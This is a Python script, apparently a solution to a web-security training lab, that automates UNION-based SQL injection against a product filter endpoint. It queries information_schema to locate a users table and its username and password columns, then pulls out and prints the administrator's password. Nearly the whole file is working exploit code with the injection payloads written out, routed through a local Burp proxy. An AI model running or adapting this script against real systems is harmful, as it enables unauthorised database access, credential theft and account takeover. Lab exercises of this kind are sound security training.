# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings
from bs4 import BeautifulSoup  # For parsing HTML content
import re  # For regular expressions

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to perform an HTTP request with a given SQL payload
def perform_request(url, sql_payload):
    path = '/filter?category=Accessories'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

# Function to find the name of the "users" table in the database
def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False

# Function to find the names of the columns in the "users" table
def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile('.*username.*'))
    password_column = soup.find(string=re.compile('.*password.*'))
    return username_column, password_column

# Function to extract the administrator's password from the "users" table
def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" % (username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
    return admin_password

# Main program execution block
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get target URL from command-line arguments
    except IndexError:
        # Print usage instructions and exit if the argument is missing
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    # Step 1: Find the name of the "users" table
    print("Looking for a users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name: %s" % users_table)
        
        # Step 2: Find the names of the columns in the "users" table
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s" % username_column)
            print("Found the password column name: %s" % password_column)
            
            # Step 3: Extract the administrator's password from the "users" table
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            else:
                print("[-] Did not find the administrator password.")
        else:
            print("Did not find the username and/or the password columns.")

    else:
        print("Did not find a users table.")
